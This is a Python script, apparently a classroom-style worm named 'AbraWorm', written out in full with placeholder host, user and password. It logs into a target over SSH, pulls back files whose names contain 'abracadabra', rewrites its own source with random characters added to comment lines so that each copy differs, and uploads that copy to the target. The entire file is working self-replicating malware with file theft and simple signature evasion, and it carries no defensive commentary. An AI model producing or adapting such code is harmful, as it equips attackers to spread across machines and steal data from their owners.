import sys


import os


import random


import paramiko


import scp


import signal


import re


import shutil as sh


def sig_handler(signum, frame):

    os.kill(os.getpid(), signal.SIGKILL)


signal.signal(signal.SIGINT, sig_handler)


files_of_interest_at_target = []


def infect():

    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect("<IP>", port=22, username="<usr>",



                password="<pass>", timeout=5)

    print("\n\nconnected\n")

    stdin, stdout, stderr = ssh.exec_command("cd <Dir>; ls")

    received_list = list(map(lambda x: str(x.strip()), stdout.readlines()))

    print("\n\noutput of 'ls' command: %s" % str(received_list))

    if "".join(received_list).find("AbraWorm") >= 0:

        print("\nThe target machine is already infected\n")

        return

    # Now let's look for files that contain the string 'abracadabra'

    cmd = "ls | grep abracadabra"

    stdin, stdout, stderr = ssh.exec_command(cmd)

    error = stderr.readlines()

    if error != []:

        print(error)

        # continue

    received_list = list(map(lambda x: x.encode("utf-8"), stdout.readlines()))

    # print(received_list)

    for item in received_list:

        files_of_interest_at_target.append(item.strip())

    print("\nfiles of interest at the target: %s" %



          str(files_of_interest_at_target))

    # success till here

    scpcon = scp.SCPClient(ssh.get_transport())

    if len(files_of_interest_at_target) > 0:

        for target_file in files_of_interest_at_target:

            scpcon.get(target_file)

    print("Replicating Worm...")


# Read contents of file into memory

    with open(sys.argv[0], "r") as f:

        contents = f.read()

    # Split contents into list of lines

    lines = contents.splitlines()

    # Choose random lines to add newlines between

    # Add newline characters between chosen lines

    OUT = open("Abra.py", "w")

    contents = "\n".join(lines)

    # Define regex pattern to match comment blocks

    comment_pattern = r"(^\s*#.*$)"

    def add_characters(match):

        extra_chars = ''.join(random.sample(



            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', k=10))

        return match.group(0) + " " + extra_chars

    contents_with_characters = re.sub(



        comment_pattern, add_characters, contents, flags=re.MULTILINE)


# split code into list of statements based on newline characters

    statements = contents_with_characters.split("\n")

    modified_code = "\n".join(statements)


# Join statements back together with newlines

    OUT.write(modified_code)

    OUT.close()

    scpcon.put("Abra.py", "<target>")

    scpcon.close()


infect()
